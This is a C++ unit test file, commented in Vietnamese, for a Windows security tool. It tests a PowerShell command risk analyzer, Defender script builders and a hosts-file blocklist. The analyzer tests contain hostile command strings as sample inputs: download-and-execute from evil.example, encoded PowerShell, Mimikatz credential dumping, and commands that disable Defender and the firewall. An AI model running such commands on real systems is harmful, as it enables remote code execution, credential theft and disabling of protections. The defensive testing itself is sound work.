// Kiểm thử lõi Security Gateway. KHÔNG cần PowerShell/Windows Defender/hosts file thật - chỉ kiểm thử
// lõi THUẦN (phân tích lệnh PowerShell tĩnh, dựng script/phân tích JSON mẫu dựng sẵn, dựng lại nội dung
// hosts file từ chuỗi mẫu) tách riêng khỏi phần gọi PowerShell/mở cửa sổ thật, giống mẫu đã dùng cho
// VpnController/PartitionManager/AdbController.
#include <QCoreApplication>
#include <cstdio>

#include "tools/security/engine/CommandAnalyzer.h"
#include "tools/security/engine/DefenderController.h"
#include "tools/security/engine/HostsBlocklist.h"

static int g_fail = 0, g_pass = 0;
#define CHECK(cond)                                                            \
    do {                                                                       \
        if (cond) { ++g_pass; }                                                \
        else { ++g_fail; std::printf("FAIL line %d: %s\n", __LINE__, #cond); } \
    } while (0)

int main(int argc, char** argv)
{
    QCoreApplication app(argc, argv);

    // ---- CommandAnalyzer: lệnh an toàn ----
    {
        CHECK(CommandAnalyzer::analyze("").isSafe());
        CHECK(CommandAnalyzer::analyze("Get-Process | Sort-Object CPU -Descending").isSafe());
        CHECK(CommandAnalyzer::analyze("Get-ChildItem C:\\Users -Recurse").isSafe());
    }

    // ---- CommandAnalyzer: đáng chú ý (Suspicious) nhưng chưa chắc độc hại ----
    {
        const auto v1 = CommandAnalyzer::analyze("powershell -WindowStyle Hidden -File setup.ps1");
        CHECK(v1.level == CommandAnalyzer::RiskLevel::Suspicious);
        CHECK(!v1.reasons.isEmpty());

        const auto v2 = CommandAnalyzer::analyze("schtasks /create /tn MyTask /tr notepad.exe /sc daily");
        CHECK(v2.level == CommandAnalyzer::RiskLevel::Suspicious);
    }

    // ---- CommandAnalyzer: nguy hiểm (Dangerous) - các mẫu phổ biến trong mã độc/tấn công thật ----
    {
        CHECK(CommandAnalyzer::analyze(
                  "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')")
                  .level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze(
                  "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA")
                  .level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("Invoke-Mimikatz -DumpCreds").level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("certutil.exe -urlcache -split -f http://evil.example/a.exe c.exe").level ==
              CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("Set-MpPreference -DisableRealtimeMonitoring $true").level ==
              CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("netsh advfirewall set allprofiles state off").level ==
              CommandAnalyzer::RiskLevel::Dangerous);

        // Dangerous phải luôn thắng Suspicious khi cả 2 cùng khớp trong 1 lệnh
        const auto combo = CommandAnalyzer::analyze(
            "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"");
        CHECK(combo.level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(combo.reasons.size() >= 2); // khớp nhiều mẫu cùng lúc
    }

    CHECK(CommandAnalyzer::riskLevelLabel(CommandAnalyzer::RiskLevel::Safe) == "An toàn");
    CHECK(CommandAnalyzer::riskLevelLabel(CommandAnalyzer::RiskLevel::Dangerous) == "Nguy hiểm");

    // ---- DefenderController: dựng script (chỉ kiểm tra NỘI DUNG CHUỖI, không gọi powershell.exe) ----
    {
        const QString statusScript = DefenderController::internal::buildGetComputerStatusScript();
        CHECK(statusScript.contains("Get-MpComputerStatus"));
        CHECK(statusScript.contains("Get-MpPreference"));
        CHECK(statusScript.contains("IsTamperProtected"));
        CHECK(statusScript.contains("AMRunningMode"));
        // Hồi quy lỗi THẬT: $p.EnableNetworkProtection là System.Byte thô (0/1/2), KHÔNG tự thành chữ
        // khi ép [string] - phải tự switch/map, nếu không networkProtectionEnabled() sẽ luôn sai.
        CHECK(statusScript.contains("switch ([int]$p.EnableNetworkProtection)"));
        CHECK(statusScript.contains("'Disabled'"));
        CHECK(statusScript.contains("'Enabled'"));

        CHECK(DefenderController::internal::buildSetRealtimeMonitoringScript(true).contains(
            "-DisableRealtimeMonitoring $false"));
        CHECK(DefenderController::internal::buildSetRealtimeMonitoringScript(false).contains(
            "-DisableRealtimeMonitoring $true"));

        CHECK(DefenderController::internal::buildSetNetworkProtectionScript(true).contains(
            "-EnableNetworkProtection Enabled"));
        CHECK(DefenderController::internal::buildSetNetworkProtectionScript(false).contains(
            "-EnableNetworkProtection Disabled"));

        const QString quick = DefenderController::internal::buildStartScanScript(DefenderController::ScanType::Quick, "");
        CHECK(quick.contains("-ScanType QuickScan"));
        CHECK(!quick.contains("-ScanPath"));

        const QString full = DefenderController::internal::buildStartScanScript(DefenderController::ScanType::Full, "");
        CHECK(full.contains("-ScanType FullScan"));

        const QString custom = DefenderController::internal::buildStartScanScript(
            DefenderController::ScanType::Custom, "D:\\Downloads");
        CHECK(custom.contains("-ScanType CustomScan"));
        CHECK(custom.contains("-ScanPath 'D:\\Downloads'"));

        CHECK(DefenderController::internal::buildListThreatsScript().contains("Get-MpThreat"));

        // Hồi quy QUAN TRỌNG: Remove-MpThreat đã xác nhận KHÔNG có tham số -ThreatID (xóa TẤT CẢ mối đe
        // dọa đang hoạt động cùng lúc, không chọn riêng từng mục) - xem DefenderController.h.
        const QString removeScript = DefenderController::internal::buildRemoveAllThreatsScript();
        CHECK(removeScript.contains("Remove-MpThreat"));
        CHECK(!removeScript.contains("-ThreatID"));
    }

    // ---- DefenderController: phân tích JSON mẫu dựng sẵn ----
    {
        const QByteArray statusJson = R"({
            "AntivirusEnabled": true, "RealTimeProtectionEnabled": true, "IsTamperProtected": true,
            "AMRunningMode": "Normal", "AntivirusSignatureVersion": "1.400.1.0",
            "AntivirusSignatureLastUpdated": "2026-10-07T08:00:00",
            "QuickScanEndTime": "2026-10-06T22:00:00", "FullScanEndTime": "",
            "NetworkProtectionMode": "Enabled"
        })";
        QString err;
        const auto status = DefenderController::internal::parseComputerStatusJson(statusJson, &err);
        CHECK(err.isEmpty());
        CHECK(status.antivirusEnabled);
        CHECK(status.realTimeProtectionEnabled);
        CHECK(status.isTamperProtected);
        CHECK(status.runningMode == "Normal");
        CHECK(status.isActivelyProtecting());
        CHECK(status.networkProtectionMode == "Enabled");
        CHECK(status.networkProtectionEnabled());
        CHECK(status.signatureLastUpdated.isValid());
        CHECK(status.lastQuickScan.isValid());
        CHECK(!status.lastFullScan.isValid()); // rỗng -> chưa từng quét toàn bộ

        // AMRunningMode khác "Normal" -> không phải AV chính đang hoạt động
        const QByteArray passiveJson = R"({"AMRunningMode": "Passive"})";
        CHECK(!DefenderController::internal::parseComputerStatusJson(passiveJson, nullptr).isActivelyProtecting());

        // Mảng bình thường (>= 2 mối đe dọa)
        const QByteArray arrayJson = R"([
            {"ThreatID": 123456789, "ThreatName": "TrojanDownloader:PowerShell/EICAR_Test_File", "SeverityID": 1, "Resources": ["C:\\temp\\eicar.txt"], "IsActive": true},
            {"ThreatID": 987654321, "ThreatName": "Trojan:Win32/Test", "SeverityID": 4, "Resources": [], "IsActive": false}
        ])";
        QString err2;
        const auto threats = DefenderController::internal::parseThreatsJson(arrayJson, &err2);
        CHECK(err2.isEmpty());
        CHECK(threats.size() == 2);
        if (threats.size() == 2)
        {
            CHECK(threats[0].threatName.contains("EICAR"));
            CHECK(threats[0].severity == 1);
            CHECK(threats[0].severityLabel() == "Thấp");
            CHECK(threats[0].isActive);
            CHECK(threats[0].resources.size() == 1);
            CHECK(threats[1].severityLabel() == "Nghiêm trọng");
            CHECK(!threats[1].isActive);
        }

        // Hồi quy: SeverityID=5 (thấy THẬT trên mối đe dọa EICAR khi kiểm tra tay) nằm ngoài phạm vi
        // tài liệu Microsoft (0-4) - vẫn phải hiển thị "Nghiêm trọng", không phải "Không rõ".
        ThreatRecord severityFive;
        severityFive.severity = 5;
        CHECK(severityFive.severityLabel() == "Nghiêm trọng");

        // PowerShell 5.1: CHỈ 1 mối đe dọa -> ConvertTo-Json trả về 1 OBJECT đơn, không bọc mảng
        const QByteArray singleJson = R"({"ThreatID": 1, "ThreatName": "Test", "SeverityID": 2, "Resources": [], "IsActive": true})";
        QString err3;
        const auto single = DefenderController::internal::parseThreatsJson(singleJson, &err3);
        CHECK(err3.isEmpty());
        CHECK(single.size() == 1);

        // Rỗng -> không có mối đe dọa nào, không phải lỗi
        CHECK(DefenderController::internal::parseThreatsJson("", nullptr).isEmpty());

        // JSON hỏng -> báo lỗi rõ ràng, không crash
        QString err4;
        CHECK(DefenderController::internal::parseThreatsJson("{khong phai json", &err4).isEmpty());
        CHECK(!err4.isEmpty());
    }

    // ---- HostsBlocklist: phân tích/dựng lại nội dung hosts file - THUẦN CHUỖI, không đụng tệp thật ----
    {
        const QString sample = QString(
            "127.0.0.1 localhost\n"
            "# vài dòng khác của người dùng - PHẢI được giữ nguyên\n"
            "192.168.1.1 router.local\n\n"
            "%1\n"
            "0.0.0.0 doc-hai-1.com\n"
            "0.0.0.0 doc-hai-2.com\n"
            "%2\n")
                                 .arg(HostsBlocklist::internal::kMarkerStart, HostsBlocklist::internal::kMarkerEnd);

        const auto domains = HostsBlocklist::internal::parseManagedDomains(sample);
        CHECK(domains.size() == 2);
        CHECK(domains.contains("doc-hai-1.com"));
        CHECK(domains.contains("doc-hai-2.com"));

        // Dựng lại với danh sách MỚI - các dòng khác của người dùng phải được giữ nguyên, khối cũ bị thay
        const QString updated = HostsBlocklist::internal::buildUpdatedHostsContent(sample, {"doc-hai-3.com"});
        CHECK(updated.contains("127.0.0.1 localhost"));
        CHECK(updated.contains("192.168.1.1 router.local"));
        CHECK(updated.contains("vài dòng khác của người dùng"));
        CHECK(!updated.contains("doc-hai-1.com"));
        CHECK(!updated.contains("doc-hai-2.com"));
        CHECK(updated.contains("0.0.0.0 doc-hai-3.com"));

        // Vòng lặp lại: phân tích nội dung vừa dựng phải cho đúng danh sách mới
        const auto reparsed = HostsBlocklist::internal::parseManagedDomains(updated);
        CHECK(reparsed.size() == 1);
        CHECK(reparsed.contains("doc-hai-3.com"));

        // Danh sách rỗng -> không còn khối nào trong nội dung mới (xóa sạch, không để lại marker trống)
        const QString cleared = HostsBlocklist::internal::buildUpdatedHostsContent(sample, {});
        CHECK(!cleared.contains(HostsBlocklist::internal::kMarkerStart));
        CHECK(cleared.contains("127.0.0.1 localhost")); // vẫn giữ nguyên nội dung khác

        // Nội dung hosts trống từ đầu (máy mới) vẫn dựng được khối hợp lệ, không crash
        const QString fromEmpty = HostsBlocklist::internal::buildUpdatedHostsContent("", {"moi.com"});
        CHECK(fromEmpty.contains("0.0.0.0 moi.com"));
    }

    std::printf("passed=%d failed=%d\n", g_pass, g_fail);
    std::printf("\nLUU Y: khong co Windows Defender/hosts file THAT trong test nay - cac ham goi\n");
    std::printf("PowerShell/doc-ghi he thong that (getStatus/startScan/listThreats/removeAllActiveThreats/\n");
    std::printf("addDomain/removeDomain/CommandLauncher) can duoc tu kiem tra tay tren may that.\n");
    return g_fail == 0 ? 0 : 1;
}
